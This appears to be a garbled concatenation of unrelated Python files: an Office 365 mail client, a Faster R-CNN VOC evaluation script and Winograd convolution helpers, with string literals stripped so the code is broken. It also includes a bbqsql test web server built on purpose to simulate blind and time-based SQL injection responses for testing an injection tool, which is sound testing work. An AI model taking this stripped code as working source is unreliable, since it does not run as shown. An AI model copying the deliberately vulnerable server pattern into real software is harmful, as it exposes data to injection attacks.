return False \n 
\n 
~~ response = requests . post ( self . send_url , data , headers = headers , auth = self . auth ) \n 
log . debug ( + str ( response ) ) \n 
\n 
if response . status_code != 202 : \n 
~~~ return False \n 
\n 
~~ return True \n 
\n 
\n 
\n 
\n 
~~ def markAsRead ( self ) : \n 
~~~ \n 
read = \'{"IsRead":true}\' \n 
headers = { : , : } \n 
try : \n 
~~~ response = requests . patch ( self . update_url . format ( self . json [ ] ) , read , headers = headers , auth = self . ~~ except : \n 
~~~ return False \n 
~~ return True \n 
\n 
\n 
~~ def getSender ( self ) : \n 
~~~ \n 
return self . json [ ] \n 
\n 
~~ def getSenderEmail ( self ) : \n 
~~~ \n 
return self . json [ ] [ ] [ ] \n 
\n 
~~ def getSenderName ( self ) : \n 
~~~ \n 
try : \n 
~~~ return self . json [ ] [ ] [ ] \n 
~~ except : \n 
~~~ return \n 
\n 
~~ ~~ def getSubject ( self ) : \n 
~~~ \n 
return self . json [ ] \n 
\n 
~~ def getBody ( self ) : \n 
~~~ \n 
return self . json [ ] [ ] \n 
\n 
~~ def setRecipients ( self , val ) : \n 
~~~ \'\'\'\n\t\tset the recipient list.\n\t\t\n\t\tval: the one argument this method takes can be very flexible. you can send:\n\t\t\ta dictionary: this must to be a dictionary formated as such:\n\t\t\t\t{"EmailAddress":{"Address":"recipient@example.com"}}\n\t\t\t\twith other options such ass "Name" with address. but at minimum\n\t\t\t\tit must have this.\n\t\t\ta list: this must to be a list of libraries formatted the way \n\t\t\t\tspecified above, or it can be a list of dictionary objects of\n\t\t\t\ttype Contact or it can be an email address as string. The \n\t\t\t\tmethod will sort out the libraries from the contacts. \n\t\t\ta string: this is if you just want to throw an email address. \n\t\t\ta contact: type Contact from this dictionary. \n\t\t\ta group: type Group, which is a list of contacts.\n\t\tFor each of these argument types the appropriate action will be taken\n\t\tto fit them to the needs of the library.\n\t\t\'\'\' \n 
self . json [ ] = [ ] \n 
if isinstance ( val , list ) : \n 
~~~ for con in val : \n 
~~~ if isinstance ( con , Contact ) : \n 
~~~ self . addRecipient ( con ) \n 
~~ elif isinstance ( con , str ) : \n 
~~~ if in con : \n 
~~~ self . addRecipient ( con ) \n 
~~ ~~ elif isinstance ( con , dict ) : \n 
~~~ self . json [ ] . append ( con ) \n 
~~ ~~ ~~ elif isinstance ( val , dict ) : \n 
~~~ self . json [ ] = [ val ] \n 
~~ elif isinstance ( val , str ) : \n 
~~~ if in val : \n 
~~~ self . addRecipient ( val ) \n 
~~ ~~ elif isinstance ( val , Contact ) : \n 
~~~ self . addRecipient ( val ) \n 
~~ elif isinstance ( val , Group ) : \n 
~~~ for person in val : \n 
~~~ self . addRecipient ( person ) \n 
~~ ~~ else : \n 
~~~ return False \n 
~~ return True \n 
\n 
~~ def addRecipient ( self , address , name = None ) : \n 
~~~ \n 
if isinstance ( address , Contact ) : \n 
~~~ self . json [ ] . append ( address . getFirstEmailAddress ( ) ) \n 
~~ elif isinstance ( address , Group ) : \n 
~~~ for con in address . contacts : \n 
~~~ self . json [ ] . append ( address . getFirstEmailAddress ( ) ) \n 
~~ ~~ else : \n 
~~~ if name is None : \n 
~~~ name = address [ : address . index ( ) ] \n 
~~ self . json [ ] . append ( { : { : address , : name } } ) \n 
\n 
~~ ~~ def setSubject ( self , val ) : \n 
~~~ \n 
self . json [ ] = val \n 
\n 
~~ def setBody ( self , val ) : \n 
~~~ \n 
cont = False \n 
\n 
while not cont : \n 
~~~ try : \n 
~~~ self . json [ ] [ ] = val \n 
self . json [ ] [ ] = \n 
cont = True \n 
~~ except : \n 
~~~ self . json [ ] = { } \n 
\n 
~~ ~~ ~~ def setBodyHTML ( self , val = None ) : \n 
~~~ \n 
self . json [ ] [ ] = \n 
if val : \n 
~~~ self . json [ ] [ ] = val \n 
\n 
\n 
#To the King! \n 
~~ ~~ ~~ from . main import Dora #!/usr/bin/env python \n 
# By Scott Behrens(arbit), 2012  \n 
\n 
"""This is a simple webserver vulnerable to SQLi injection\nmake your query string look like this: http://127.0.0.1:8090/time?row_index=1&character_index=1&character_value=95&comparator=>&sleep=1\n\ncommand line usage:\n    python ./test_server.py [--rows=50 --cols=150]\n        :rows   -   this controls how many rows of random data to use for the database\n        :cols   -   this controls how many rows of random data to use for the database\n""" \n 
\n 
import eventlet \n 
from eventlet import wsgi \n 
from eventlet . green import time \n 
from urlparse import parse_qs \n 
from random import random , choice \n 
\n 
datas = [ , ] \n 
\n 
# Different comparators BBsql uses \n 
comparators = [ , , , ] \n 
\n 
\n 
def parse_response ( env , start_response ) : \n 
~~~ \n 
\n 
#add in some random delay \n 
delay = random ( ) \n 
time . sleep ( delay / 10 ) \n 
\n 
try : \n 
~~~ params = parse_qs ( env [ ] ) \n 
\n 
# Extract out all of the sqli information \n 
row_index = int ( params [ ] [ 0 ] ) \n 
char_index = int ( params [ ] [ 0 ] ) - 1 \n 
test_char = int ( params [ ] [ 0 ] ) \n 
comparator = comparators . index ( params [ ] [ 0 ] ) - 1 \n 
try : \n 
~~~ sleep_int = float ( params [ ] . pop ( 0 ) ) \n 
~~ except KeyError : \n 
~~~ sleep_int = 1 \n 
\n 
# Determine which character position we are at during the injection \n 
~~ current_character = datas [ row_index ] [ char_index ] \n 
\n 
# figure out if it was true \n 
truth = ( cmp ( ord ( current_character ) , test_char ) == comparator ) \n 
\n 
#some debugging \n 
#print "\\n\\n" \n 
#print "%d %s %d == %s" % (ord(current_character),params[\'comparator\'][0],test_char,str(truth)) #print "char_index       : %d" % char_index \n 
#print "row_index        : %d" % row_index \n 
\n 
# Call the function for what path was given based on the path provided \n 
response = types [ env [ ] ] ( test_char , current_character , comparator , sleep_int , start_response \n 
return response \n 
~~ except : \n 
~~~ start_response ( , [ ( , ) ] ) \n 
return [ ] \n 
\n 
\n 
~~ ~~ def time_based_blind ( test_char , current_character , comparator , sleep_int , start_response , truth ) : \n 
# Snage the query string and parse it into a dict \n 
~~~ sleep_time = sleep_int * truth \n 
time . sleep ( sleep_time ) \n 
start_response ( , [ ( , ) ] ) \n 
return [ ] \n 
\n 
\n 
~~ def boolean_based_error ( test_char , current_character , comparator , env , start_response , truth ) : \n 
# Snage the query string and parse it into a dict \n 
~~~ if truth : \n 
~~~ start_response ( , [ ( , ) ] ) \n 
return [ ] \n 
~~ else : \n 
~~~ start_response ( , [ ( , ) ] ) \n 
return [ ] \n 
\n 
\n 
~~ ~~ def boolean_based_size ( test_char , current_character , comparator , env , start_response , truth ) : \n 
# Snage the query string and parse it into a dict \n 
~~~ if truth : \n 
~~~ start_response ( , [ ( , ) ] ) \n 
return [ ] \n 
~~ else : \n 
~~~ start_response ( , [ ( , ) ] ) \n 
return [ ] \n 
\n 
\n 
~~ ~~ types = { : time_based_blind , : boolean_based_error , : boolean_based_size } \n 
\n 
if __name__ == "__main__" : \n 
# Start the server \n 
~~~ print "\\n" \n 
print "bbqsql http server\\n\\n" \n 
print "used to unit test boolean, blind, and error based sql injection" \n 
print "use the following syntax: http://127.0.0.1:8090/time?row_index=1&character_index=1&character_value=95&comparator=>&sleep=1" print "path can be set to /time,  /error, or /boolean" \n 
print "\\n" \n 
\n 
from sys import argv \n 
import re \n 
\n 
CHARSET = [ chr ( x ) for x in xrange ( 32 , 127 ) ] \n 
\n 
rre = re . compile ( ) \n 
cre = re . compile ( ) \n 
rows = filter ( rre . match , argv ) \n 
cols = filter ( cre . match , argv ) \n 
\n 
if rows and cols : \n 
~~~ rows = rows [ 0 ] \n 
cols = cols [ 0 ] \n 
\n 
CHARSET = [ chr ( x ) for x in xrange ( 32 , 127 ) ] \n 
datas = [ ] \n 
for asdf in range ( 5 ) : \n 
~~~ datas . append ( "" ) \n 
for fdsa in range ( 100 ) : \n 
~~~ datas [ - 1 ] += choice ( CHARSET ) \n 
\n 
~~ ~~ ~~ wsgi . server ( eventlet . listen ( ( , 8090 ) ) , parse_response ) \n 
# ---------------------------------------------------------------------------- \n 
# Copyright 2016 Nervana Systems Inc. \n 
# Licensed under the Apache License, Version 2.0 (the "License"); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
#      http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
# ---------------------------------------------------------------------------- \n 
# -------------------------------------------------------- \n 
# Fast/er R-CNN \n 
# Licensed under The MIT License [see LICENSE for details] \n 
# Written by Bharath Hariharan \n 
# -------------------------------------------------------- \n 
~~ """\nThe mAP evaluation script and various util functions are from:\nhttps://github.com/rbgirshick/py-faster-rcnn/commit/45e0da9a246fab5fd86e8c96dc351be7f145499f\n""" \n 
\n 
import xml . etree . ElementTree as ET \n 
import os \n 
import cPickle \n 
import numpy as np \n 
\n 
\n 
def parse_rec ( filename ) : \n 
~~~ """ Parse a PASCAL VOC xml file """ \n 
tree = ET . parse ( filename ) \n 
objects = [ ] \n 
for obj in tree . findall ( ) : \n 
~~~ obj_struct = { } \n 
obj_struct [ ] = obj . find ( ) . text \n 
obj_struct [ ] = obj . find ( ) . text \n 
obj_struct [ ] = int ( obj . find ( ) . text ) \n 
obj_struct [ ] = int ( obj . find ( ) . text ) \n 
bbox = obj . find ( ) \n 
obj_struct [ ] = [ int ( bbox . find ( ) . text ) , \n 
int ( bbox . find ( ) . text ) , \n 
int ( bbox . find ( ) . text ) , \n 
int ( bbox . find ( ) . text ) ] \n 
objects . append ( obj_struct ) \n 
\n 
~~ return objects \n 
\n 
\n 
~~ def voc_ap ( rec , prec , use_07_metric = False ) : \n 
~~~ """ ap = voc_ap(rec, prec, [use_07_metric])\n    Compute VOC AP given precision and recall.\n    If use_07_metric is true, uses the\n    VOC 07 11 point method (default:False).\n    """ \n 
if use_07_metric : \n 
# 11 point metric \n 
~~~ ap = 0. \n 
for t in np . arange ( 0. , 1.1 , 0.1 ) : \n 
~~~ if np . sum ( rec >= t ) == 0 : \n 
~~~ p = 0 \n 
~~ else : \n 
~~~ p = np . max ( prec [ rec >= t ] ) \n 
~~ ap = ap + p / 11. \n 
~~ ~~ else : \n 
# correct AP calculation \n 
# first append sentinel values at the end \n 
~~~ mrec = np . concatenate ( ( [ 0. ] , rec , [ 1. ] ) ) \n 
mpre = np . concatenate ( ( [ 0. ] , prec , [ 0. ] ) ) \n 
\n 
# compute the precision envelope \n 
for i in range ( mpre . size - 1 , 0 , - 1 ) : \n 
~~~ mpre [ i - 1 ] = np . maximum ( mpre [ i - 1 ] , mpre [ i ] ) \n 
\n 
# to calculate area under PR curve, look for points \n 
# where X axis (recall) changes value \n 
~~ i = np . where ( mrec [ 1 : ] != mrec [ : - 1 ] ) [ 0 ] \n 
\n 
# and sum (\\Delta recall) * prec \n 
ap = np . sum ( ( mrec [ i + 1 ] - mrec [ i ] ) * mpre [ i + 1 ] ) \n 
~~ return ap \n 
\n 
\n 
~~ def voc_eval ( detpath , \n 
annopath , \n 
imagesetfile , \n 
classname , \n 
cachedir , \n 
ovthresh = 0.5 , \n 
use_07_metric = False ) : \n 
~~~ """rec, prec, ap = voc_eval(detpath,\n                                annopath,\n                                imagesetfile,\n                                classname,\n                                [ovthresh],\n                                [use_07_metric])\n\n    Top level function that does the PASCAL VOC evaluation.\n\n    detpath: Path to detections\n        detpath.format(classname) should produce the detection results file.\n    annopath: Path to annotations\n        annopath.format(imagename) should be the xml annotations file.\n    imagesetfile: Text file containing the list of images, one image per line.\n    classname: Category name (duh)\n    cachedir: Directory for caching the annotations\n    [ovthresh]: Overlap threshold (default = 0.5)\n    [use_07_metric]: Whether to use VOC07\'s 11 point AP computation\n        (default False)\n    """ \n 
# assumes detections are in detpath.format(classname) \n 
# assumes annotations are in annopath.format(imagename) \n 
# assumes imagesetfile is a text file with each line an image name \n 
# cachedir caches the annotations in a pickle file \n 
\n 
# first load gt \n 
if not os . path . isdir ( cachedir ) : \n 
~~~ os . mkdir ( cachedir ) \n 
~~ cachefile = os . path . join ( cachedir , ) \n 
# read list of images \n 
with open ( imagesetfile , ) as f : \n 
~~~ lines = f . readlines ( ) \n 
~~ imagenames = [ x . strip ( ) for x in lines ] \n 
\n 
if not os . path . isfile ( cachefile ) : \n 
# load annots \n 
~~~ recs = { } \n 
for i , imagename in enumerate ( imagenames ) : \n 
~~~ recs [ imagename ] = parse_rec ( annopath . format ( imagename ) ) \n 
if i % 100 == 0 : \n 
~~~ print . format ( \n 
i + 1 , len ( imagenames ) ) \n 
# save \n 
~~ ~~ print . format ( cachefile ) \n 
with open ( cachefile , ) as f : \n 
~~~ cPickle . dump ( recs , f ) \n 
~~ ~~ else : \n 
# load \n 
~~~ with open ( cachefile , ) as f : \n 
~~~ recs = cPickle . load ( f ) \n 
\n 
# extract gt objects for this class \n 
~~ ~~ class_recs = { } \n 
npos = 0 \n 
for imagename in imagenames : \n 
~~~ R = [ obj for obj in recs [ imagename ] if obj [ ] == classname ] \n 
bbox = np . array ( [ x [ ] for x in R ] ) \n 
difficult = np . array ( [ x [ ] for x in R ] ) . astype ( np . bool ) \n 
det = [ False ] * len ( R ) \n 
npos = npos + sum ( ~ difficult ) \n 
class_recs [ imagename ] = { : bbox , \n 
: difficult , \n 
: det } \n 
\n 
# read dets \n 
~~ detfile = detpath . format ( classname ) \n 
with open ( detfile , ) as f : \n 
~~~ lines = f . readlines ( ) \n 
\n 
~~ splitlines = [ x . strip ( ) . split ( ) for x in lines ] \n 
image_ids = [ x [ 0 ] for x in splitlines ] \n 
confidence = np . array ( [ float ( x [ 1 ] ) for x in splitlines ] ) \n 
BB = np . array ( [ [ float ( z ) for z in x [ 2 : ] ] for x in splitlines ] ) \n 
\n 
# sort by confidence \n 
sorted_ind = np . argsort ( - confidence ) \n 
# sorted_scores = np.sort(-confidence) \n 
BB = BB [ sorted_ind , : ] \n 
image_ids = [ image_ids [ x ] for x in sorted_ind ] \n 
\n 
# go down dets and mark TPs and FPs \n 
nd = len ( image_ids ) \n 
tp = np . zeros ( nd ) \n 
fp = np . zeros ( nd ) \n 
for d in range ( nd ) : \n 
~~~ R = class_recs [ image_ids [ d ] ] \n 
bb = BB [ d , : ] . astype ( float ) \n 
ovmax = - np . inf \n 
BBGT = R [ ] . astype ( float ) \n 
\n 
if BBGT . size > 0 : \n 
# compute overlaps \n 
# intersection \n 
~~~ ixmin = np . maximum ( BBGT [ : , 0 ] , bb [ 0 ] ) \n 
iymin = np . maximum ( BBGT [ : , 1 ] , bb [ 1 ] ) \n 
ixmax = np . minimum ( BBGT [ : , 2 ] , bb [ 2 ] ) \n 
iymax = np . minimum ( BBGT [ : , 3 ] , bb [ 3 ] ) \n 
iw = np . maximum ( ixmax - ixmin + 1. , 0. ) \n 
ih = np . maximum ( iymax - iymin + 1. , 0. ) \n 
inters = iw * ih \n 
\n 
# union \n 
uni = ( ( bb [ 2 ] - bb [ 0 ] + 1. ) * ( bb [ 3 ] - bb [ 1 ] + 1. ) + \n 
( BBGT [ : , 2 ] - BBGT [ : , 0 ] + 1. ) * \n 
( BBGT [ : , 3 ] - BBGT [ : , 1 ] + 1. ) - inters ) \n 
\n 
overlaps = inters / uni \n 
ovmax = np . max ( overlaps ) \n 
jmax = np . argmax ( overlaps ) \n 
\n 
~~ if ovmax > ovthresh : \n 
~~~ if not R [ ] [ jmax ] : \n 
~~~ if not R [ ] [ jmax ] : \n 
~~~ tp [ d ] = 1. \n 
R [ ] [ jmax ] = 1 \n 
~~ else : \n 
~~~ fp [ d ] = 1. \n 
~~ ~~ ~~ else : \n 
~~~ fp [ d ] = 1. \n 
\n 
# compute precision recall \n 
~~ ~~ fp = np . cumsum ( fp ) \n 
tp = np . cumsum ( tp ) \n 
rec = tp / float ( npos ) \n 
prec = tp / ( tp + fp + 1e-10 ) \n 
ap = voc_ap ( rec , prec , use_07_metric ) \n 
\n 
return rec , prec , ap \n 
# -*- coding: utf-8 -*- \n 
# Copyright (c) 2012 Thomas Parslow http://almostobsolete.net/ \n 
# \n 
# Permission is hereby granted, free of charge, to any person obtaining a \n 
# copy of this software and associated documentation files (the \n 
# "Software"), to deal in the Software without restriction, including \n 
# without limitation the rights to use, copy, modify, merge, publish, dis- \n 
# tribute, sublicense, and/or sell copies of the Software, and to permit \n 
# persons to whom the Software is furnished to do so, subject to the fol- \n 
# lowing conditions: \n 
# \n 
# The above copyright notice and this permission notice shall be included \n 
# in all copies or substantial portions of the Software. \n 
# \n 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS \n 
# OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABIL- \n 
# ITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT \n 
# SHALL THE AUTHOR BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, \n 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, \n 
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS \n 
# IN THE SOFTWARE. \n 
# \n 
#!/usr/bin/python \n 
\n 
# Copyright 2015 Nervana Systems Inc. All rights reserved. \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the "License"); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
#    http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
~~ import numpy as np \n 
from ipdb import set_trace \n 
from struct import pack , unpack \n 
\n 
def ceil_div ( x , y ) : \n 
~~~ return - ( - x // y ) \n 
\n 
~~ def out_dim ( S , X , padding , strides ) : \n 
~~~ return ceil_div ( X - S + 1 + 2 * padding , strides ) \n 
\n 
~~ def strip_mantissa ( val ) : \n 
~~~ i = unpack ( , pack ( , val ) ) [ 0 ] & 0x7f800000 \n 
f = unpack ( , pack ( , i ) ) [ 0 ] \n 
return f \n 
\n 
~~ def quantize ( ary , bits , sign = 1 ) : \n 
~~~ maxval = float ( np . max ( np . absolute ( ary ) ) ) \n 
scale = strip_mantissa ( maxval ) / float ( 1 << ( bits - sign - 1 ) ) \n 
ary = np . around ( ary * ( 1.0 / scale ) ) . astype ( np . int64 ) \n 
return ary , np . float64 ( scale ) \n 
\n 
######### Direct Convolution ######### \n 
\n 
~~ def fconv_slice ( q , S , X , padding , strides ) : \n 
~~~ f1 = 0 \n 
f2 = S - 1 \n 
x1 = q * strides - padding \n 
x2 = x1 + f2 \n 
if x1 < 0 : \n 
~~~ f1 = - x1 \n 
x1 = 0 \n 
~~ if x2 >= X : \n 
~~~ dif = x2 - X + 1 \n 
f2 -= dif \n 
x2 -= dif \n 
~~ return ( slice ( f1 , f2 + 1 ) , slice ( x1 , x2 + 1 ) , f2 - f1 + 1 ) \n 
\n 
~~ def bconv_slice ( x , S , Q , padding , strides ) : \n 
~~~ qs = x - ( S - padding - 1 ) \n 
firstF = None \n 
for s in range ( S ) : #TODO remove loop logic here. \n 
~~~ q = qs + s \n 
if q % strides == 0 : \n 
~~~ q strides \n 
if q >= 0 and q < Q : \n 
~~~ if firstF is None : \n 
~~~ firstF = s \n 
firstE = q \n 
~~ lastF = s \n 
lastE = q \n 
~~ ~~ ~~ return ( slice ( firstF , lastF + 1 , strides ) , slice ( firstE , lastE + 1 , strides ) , 0 ) \n 
\n 
~~ def xprop_direct ( I , F , O , padding , strides , backward = False ) : \n 
\n 
~~~ if all ( x == 1 for x in F . shape [ 1 : 3 ] ) : \n 
~~~ C = F . shape [ 0 ] \n 
K = F . shape [ 4 ] \n 
if backward : \n 
# CxHWN = CxK . KxHWN \n 
~~~ O [ : ] = np . dot ( F . reshape ( ( C , - 1 ) ) , I . reshape ( ( K , - 1 ) ) ) . reshape ( ( O . shape ) ) \n 
~~ else : \n 
# KxHWN = CxK.T . CxHWN \n 
~~~ O [ : ] = np . dot ( F . reshape ( ( C , - 1 ) ) . T , I . reshape ( ( C , - 1 ) ) ) . reshape ( ( O . shape ) ) \n 
~~ return \n 
\n 
~~ if backward : \n 
# C <=> K and mirror R,S \n 
~~~ F = np . transpose ( F [ : , : : - 1 , : : - 1 , : ] , ( 3 , 1 , 2 , 0 ) ) . copy ( ) \n 
xconv_slice = bconv_slice \n 
~~ else : \n 
~~~ xconv_slice = fconv_slice \n 
\n 
~~ C , Y , X , N = I . shape \n 
C , R , S , K = F . shape \n 
K , P , Q , N = O . shape \n 
\n 
qSlice = [ xconv_slice ( q , S , X , padding [ 0 ] , strides [ 0 ] ) for q in range ( Q ) ] \n 
\n 
for p in range ( P ) : \n 
~~~ sliceR , sliceY , _ = xconv_slice ( p , R , Y , padding [ 1 ] , strides [ 1 ] ) \n 
\n 
for q in range ( Q ) : \n 
~~~ sliceS , sliceX , _ = qSlice [ q ] \n 
\n 
slicedF = F [ : , sliceR , sliceS , : ] . reshape ( ( - 1 , K ) ) \n 
slicedI = I [ : , sliceY , sliceX , : ] . reshape ( ( - 1 , N ) ) \n 
\n 
O [ : , p , q , : ] = np . dot ( slicedF . T , slicedI ) \n 
\n 
~~ ~~ ~~ def updat_direct ( I , E , U , padding , strides ) : \n 
\n 
~~~ C , Y , X , N = I . shape \n 
K , P , Q , N = E . shape \n 
C , R , S , K = U . shape \n 
\n 
if all ( x == 1 for x in ( R , S ) ) : \n 
# CxK = CxHWN . KxHWN.T \n 
~~~ U [ : ] = np . dot ( I . reshape ( ( C , - 1 ) ) , E . reshape ( ( K , - 1 ) ) . T ) . reshape ( ( U . shape ) ) \n 
return \n 
\n 
~~ U . fill ( 0.0 ) \n 
\n 
qSlice = [ fconv_slice ( q , S , X , padding [ 0 ] , strides [ 0 ] ) for q in range ( Q ) ] \n 
\n 
for p in range ( P ) : \n 
~~~ sliceR , sliceY , rlen = fconv_slice ( p , R , Y , padding [ 1 ] , strides [ 1 ] ) \n 
\n 
for q in range ( Q ) : \n 
~~~ sliceS , sliceX , slen = qSlice [ q ] \n 
\n 
slicedI = I [ : , sliceY , sliceX , : ] . reshape ( ( - 1 , N ) ) \n 
slicedE = E [ : , p , q , : ] \n 
\n 
U [ : , sliceR , sliceS , : ] += np . dot ( slicedI , slicedE . T ) . reshape ( ( C , rlen , slen , K ) ) \n 
\n 
######### Winograd Convolution ######### \n 
\n 
\n 
\n 
~~ ~~ ~~ I_4x4_3x3 = ( \n 
np . array ( [ \n 
[ 4.0 , 0.0 , - 5.0 , 0.0 , 1.0 , 0.0 ] , \n 
[ 0.0 , - 4.0 , - 4.0 , 1.0 , 1.0 , 0.0 ] , \n 
[ 0.0 , 4.0 , - 4.0 , - 1.0 , 1.0 , 0.0 ] , \n 
[ 0.0 , - 2.0 , - 1.0 , 2.0 , 1.0 , 0.0 ] , \n 
[ 0.0 , 2.0 , - 1.0 , - 2.0 , 1.0 , 0.0 ] , \n 
[ 0.0 , 4.0 , 0.0 , - 5.0 , 0.0 , 1.0 ] ] ) , \n 
\n 
np . array ( [ \n 
[ 4.0 , 0.0 , - 5.0 , 0.0 , 1.0 , 0.0 ] , \n 
[ 0.0 , - 4.0 , - 4.0 , 1.0 , 1.0 , 0.0 ] , \n 
[ 0.0 , 4.0 , - 4.0 , - 1.0 , 1.0 , 0.0 ] , \n 
[ 0.0 , - 2.0 , - 1.0 , 2.0 , 1.0 , 0.0 ] , \n 
[ 0.0 , 2.0 , - 1.0 , - 2.0 , 1.0 , 0.0 ] , \n 
[ 0.0 , 4.0 , 0.0 , - 5.0 , 0.0 , 1.0 ] ] ) , \n 
\n 
np . array ( [ \n 
[ 1.0 , 0.0 , - 5.0 / 4.0 , 0.0 , 1.0 / 4.0 , 0.0 ] , \n 
[ 0.0 , 2.0 / 3.0 , 2.0 / 3.0 , - 1.0 / 6.0 , - 1.0 / 6.0 , 0.0 ] , \n 
[ 0.0 , - 2.0 / 3.0 , 2.0 / 3.0 , 1.0 / 6.0 , - 1.0 / 6.0 , 0.0 ] , \n 
[ 0.0 , - 1.0 / 12. , - 1.0 / 24. , 1.0 / 12. , 1.0 / 24. , 0.0 ] , \n 
[ 0.0 , 1.0 / 12. , - 1.0 / 24. , - 1.0 / 12. , 1.0 / 24. , 0.0 ] , \n 
[ 0.0 , 4.0 , 0.0 , - 5.0 , 0.0 , 1.0 ] ] ) , \n 
) \n 
\n 
F_4x4_3x3 = ( \n 
np . array ( [ \n 
[ 1.0 / 4.0 , 0.0 , 0.0 ] , \n 
[ - 1.0 / 6.0 , - 1.0 / 6.0 , - 1.0 / 6.0 ] , \n 
[ - 1.0 / 6.0 , 1.0 / 6.0 , - 1.0 / 6.0 ] , \n 
[ 1.0 / 24. , 1.0 / 12. , 1.0 / 6.0 ] , \n 
[ 1.0 / 24. , - 1.0 / 12. , 1.0 / 6.0 ] , \n 
[ 0.0 , 0.0 , 1.0 ] ] ) , \n 
\n 
np . array ( [ \n 
[ 1.0 , 0.0 , 0.0 ] , \n 
[ 1.0 , 1.0 , 1.0 ] , \n 
[ 1.0 , - 1.0 , 1.0 ] , \n 
[ 1.0 , 2.0 , 4.0 ] , \n 
[ 1.0 , - 2.0 , 4.0 ] , \n 
[ 0.0 , 0.0 , 1.0 ] ] ) , \n 
\n 
np . array ( [ \n 
[ 1.0 , 0.0 , 0.0 ] , \n 
[ 1.0 , 1.0 , 1.0 ] , \n 
[ 1.0 , - 1.0 , 1.0 ] , \n 
[ 1.0 , 2.0 , 4.0 ] , \n 
[ 1.0 , - 2.0 , 4.0 ] , \n 
[ 0.0 , 0.0 , 1.0 ] ] ) , \n 
) \n 
\n 
O_4x4_3x3 = ( \n 
np . array ( [ \n 
[ 1.0 , 1.0 , 1.0 , 1.0 , 1.0 , 0.0 ] , \n 
[ 0.0 , 1.0 , - 1.0 , 2.0 , - 2.0 , 0.0 ] , \n 
[ 0.0 , 1.0 , 1.0 , 4.0 , 4.0 , 0.0 ] , \n 
[ 0.0 , 1.0 , - 1.0 , 8.0 , - 8.0 , 1.0 ] ] ) , \n 
\n 
np . array ( [ \n 
[ 1.0 / 4.0 , - 1.0 / 6.0 , - 1.0 / 6.0 , 1.0 / 24. , 1.0 / 24. , 0.0 ] , \n 
[ 0.0 , - 1.0 / 6.0 , 1.0 / 6.0 , 1.0 / 12. , - 1.0 / 12. , 0.0 ] , \n 
[ 0.0 , - 1.0 / 6.0 , - 1.0 / 6.0 , 1.0 / 6.0 , 1.0 / 6.0 , 0.0 ] , \n 
[ 0.0 , - 1.0 / 6.0 , 1.0 / 6.0 , 1.0 / 3.0 , - 1.0 / 3.0 , 1.0 ] ] ) , \n 
\n 
np . array ( [ \n 
[ 1.0 , 1.0 , 1.0 , 1.0 , 1.0 , 0.0 ] , \n 
[ 0.0 , 1.0 , - 1.0 , 2.0 , - 2.0 , 0.0 ] , \n 
[ 0.0 , 1.0 , 1.0 , 4.0 , 4.0 , 0.0 ] , \n 
[ 0.0 , 1.0 , - 1.0 , 8.0 , - 8.0 , 1.0 ] ] ) , \n 
) \n 
\n 
rcp3 = 1.0 / 3.0 \n 
rcp4 = 1.0 / 4.0 \n 
rcp6 = 1.0 / 6.0 \n 
rcp12 = 1.0 / 12.0 \n 
rcp24 = 1.0 / 24.0 \n 
\n 
def trans_I_4x4_3x3 ( Iw , I , minimal = False , trans = False ) : \n 
~~~ if minimal : \n 
\n 
~~~ T0 = np . empty ( ( 6 , 6 ) ) \n 
T1 = np . empty ( ( 6 , 6 ) ) \n 
\n 
for O , I in ( ( T0 , I ) , ( T1 , T0 . T ) ) : \n 
\n 
# t0 = I[4,:] - I[2,:]*4.0 \n 
# t1 = I[3,:] - I[1,:]*4.0 \n 
# t2 = I[4,:] - I[2,:] \n 
# t3 = I[3,:] - I[1,:] \n 
\n 
# O[0,:] = I[0,:]*4.0 - I[2,:]*5.0 + I[4,:] \n 
# O[1,:] = t0 + t1 \n 
# O[2,:] = t0 - t1 \n 
# O[3,:] = t2 + t3*2.0 \n 
# O[4,:] = t2 - t3*2.0 \n 
# O[5,:] = I[1,:]*4.0 - I[3,:]*5.0 + I[5,:] \n 
\n 
~~~ t0 = ( I [ 2 , : ] * 4.0 - I [ 4 , : ] ) * rcp6 \n 
t1 = ( I [ 1 , : ] * 4.0 - I [ 3 , : ] ) * rcp6 \n 
t2 = ( I [ 4 , : ] - I [ 2 , : ] ) * rcp24 \n 
t3 = ( I [ 3 , : ] - I [ 1 , : ] ) * rcp12 \n 
\n 
O [ 0 , : ] = I [ 0 , : ] + ( I [ 2 , : ] * - 5.0 + I [ 4 , : ] ) * rcp4 \n 
O [ 1 , : ] = t0 + t1 \n 
O [ 2 , : ] = t0 - t1 \n 
O [ 3 , : ] = t2 + t3 \n 
O [ 4 , : ] = t2 - t3 \n 
O [ 5 , : ] = I [ 1 , : ] * 4.0 - I [ 3 , : ] * 5.0 + I [ 5 , : ] \n 
\n 
~~ Iw [ : ] = T1 . T \n 
\n 
~~ else : \n 
~~~ Iw [ : ] = np . dot ( np . dot ( I_4x4_3x3 [ trans [ 0 ] ] , I ) , I_4x4_3x3 [ trans [ 1 ] ] . T ) \n 
\n 
~~ ~~ def trans_F_4x4_3x3 ( Fw , F , minimal = False , trans = False ) : \n 
~~~ if minimal : \n 
\n 
~~~ T0 = np . empty ( ( 6 , 3 ) ) \n 
T1 = np . empty ( ( 6 , 6 ) ) \n 
\n 
for O , I in ( ( T0 , F ) , ( T1 , T0 . T ) ) : \n 
\n 
# t0 =  rcp6  * I[2,:] \n 
